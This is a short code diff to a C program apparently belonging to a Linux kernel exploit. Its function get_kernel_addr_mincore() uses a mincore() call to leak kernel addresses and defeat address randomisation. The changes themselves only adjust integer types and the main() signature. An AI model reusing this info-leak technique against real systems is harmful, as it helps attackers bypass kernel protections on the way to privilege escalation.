@@ -36,7 +36,7 @@ unsigned long get_kernel_addr_mincore() {
     return 0;
   }
 
-  int i;
+  unsigned long i;
   for (i = 0; i <= iterations; i++) {
     /* Touch a mishandle with this type mapping */
     if (mincore((void *)0x86000000, 0x1000000, buf)) {
@@ -44,8 +44,8 @@ unsigned long get_kernel_addr_mincore() {
       return 0;
     }
 
-    int n;
-    for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {
+    unsigned long n;
+    for (n = 0; n < (unsigned long)getpagesize() / sizeof(unsigned char); n++) {
       addr = *(unsigned long *)(&buf[n]);
       /* Kernel address space */
       if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
@@ -63,7 +63,7 @@ unsigned long get_kernel_addr_mincore() {
   return 0;
 }
 
-int main(int argc, char **argv) {
+int main() {
 #if defined(__x86_64__) || defined(__amd64__)
   printf("[.] trying mincore info leak...\n");
 
